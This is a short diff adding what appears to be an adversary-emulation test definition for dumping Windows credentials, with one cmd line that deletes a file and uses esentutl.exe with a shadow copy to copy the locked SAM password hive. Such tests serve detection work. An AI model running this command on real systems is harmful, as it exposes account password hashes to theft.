@@ -1,0 +1,7 @@
+#TechniqueName: OS Credential Dumping: Security Account Manager
+#AtomicTestName: esentutl.exe SAM copy
+#Language: cmd
+
+#commands
+del %windir%\SAM & esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %windir%/SAM
+
